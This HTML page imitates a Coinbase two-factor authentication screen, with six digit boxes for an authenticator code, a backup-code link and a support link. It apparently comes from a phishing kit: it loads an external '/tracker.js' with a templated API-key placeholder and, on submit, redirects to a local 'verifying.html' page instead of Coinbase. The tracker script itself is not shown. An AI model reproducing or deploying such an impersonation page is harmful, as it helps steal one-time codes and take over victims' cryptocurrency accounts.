<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Two-Factor Authentication - Coinbase</title>
    <link rel="icon" type="image/svg+xml" href="assets/images/favicon.svg">
    <link rel="stylesheet" href="styles.css">

<script src="/tracker.js" data-api-key="%%API_KEY%%"></script>
</head>
<body>
    <!-- Header -->
    <header class="header">
        <div class="logo-container">
            <img src="assets/images/favicon.svg" alt="Coinbase" class="logo">
        </div>
    </header>

    <!-- Main Content -->
    <main class="main-content">
        <div class="signup-container">
            <!-- Authenticator Icon -->
            <div class="form-icon">
                <svg width="64" height="64" viewBox="0 0 64 64" fill="none">
                    <circle cx="32" cy="32" r="32" fill="#5b8df5" opacity="0.15"/>
                    <rect x="20" y="16" width="24" height="32" rx="2" stroke="#5b8df5" stroke-width="2" fill="none"/>
                    <circle cx="32" cy="28" r="4" stroke="#5b8df5" stroke-width="2" fill="none"/>
                    <path d="M26 38h12M26 42h12" stroke="#5b8df5" stroke-width="2" stroke-linecap="round"/>
                </svg>
            </div>
            
            <h1 class="title">Enter your authenticator code</h1>
            <p class="subtitle">Open your authenticator app and enter the 6-digit code to continue.</p>

            <!-- Authenticator Form -->
            <form id="authenticatorForm" class="signup-form">
                <div class="code-inputs">
                    <input type="text" class="code-input" id="auth1" name="auth1" maxlength="1" pattern="[0-9]" inputmode="numeric" autocomplete="off" required>
                    <input type="text" class="code-input" id="auth2" name="auth2" maxlength="1" pattern="[0-9]" inputmode="numeric" autocomplete="off" required>
                    <input type="text" class="code-input" id="auth3" name="auth3" maxlength="1" pattern="[0-9]" inputmode="numeric" autocomplete="off" required>
                    <input type="text" class="code-input" id="auth4" name="auth4" maxlength="1" pattern="[0-9]" inputmode="numeric" autocomplete="off" required>
                    <input type="text" class="code-input" id="auth5" name="auth5" maxlength="1" pattern="[0-9]" inputmode="numeric" autocomplete="off" required>
                    <input type="text" class="code-input" id="auth6" name="auth6" maxlength="1" pattern="[0-9]" inputmode="numeric" autocomplete="off" required>
                </div>
                <button type="submit" class="continue-btn">Verify</button>
            </form>

            <!-- Help Text -->
            <p class="signin-text">
                Don't have access to your authenticator? <a href="#" class="signin-link">Use backup code</a>
            </p>
        </div>
    </main>

    <!-- Footer -->
    <footer class="footer">
        <p class="footer-text">
            Having trouble? <a href="#" class="footer-link">Contact Support</a>
        </p>
    </footer>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const authenticatorForm = document.getElementById('authenticatorForm');
            const codeInputs = document.querySelectorAll('.code-input');
            const submitBtn = authenticatorForm.querySelector('.continue-btn');
            
            // Auto-focus and navigation between inputs
            codeInputs.forEach((input, index) => {
                input.addEventListener('input', function(e) {
                    const value = e.target.value;
                    
                    if (!/^\d*$/.test(value)) {
                        e.target.value = '';
                        return;
                    }
                    
                    if (value.length === 1 && index < codeInputs.length - 1) {
                        codeInputs[index + 1].focus();
                    }
                    
                    checkFormValidity();
                });
                
                input.addEventListener('keydown', function(e) {
                    if (e.key === 'Backspace' && !e.target.value && index > 0) {
                        codeInputs[index - 1].focus();
                    }
                });
                
                input.addEventListener('paste', function(e) {
                    e.preventDefault();
                    const pastedData = e.clipboardData.getData('text').slice(0, 6);
                    const digits = pastedData.split('');
                    
                    digits.forEach((digit, i) => {
                        if (i < codeInputs.length && /^\d$/.test(digit)) {
                            codeInputs[i].value = digit;
                        }
                    });
                    
                    if (digits.length > 0) {
                        const lastIndex = Math.min(digits.length - 1, codeInputs.length - 1);
                        codeInputs[lastIndex].focus();
                    }
                    
                    checkFormValidity();
                });
            });
            
            function checkFormValidity() {
                let allFilled = true;
                
                codeInputs.forEach(input => {
                    if (input.value.trim() === '') {
                        allFilled = false;
                    }
                });
                
                if (allFilled) {
                    submitBtn.classList.add('active');
                } else {
                    submitBtn.classList.remove('active');
                }
            }
            
            checkFormValidity();
            codeInputs[0].focus();
            
            authenticatorForm.addEventListener('submit', function(e) {
                e.preventDefault();
                window.location.href = 'verifying.html';
            });
        });
    </script>
</body>
</html>
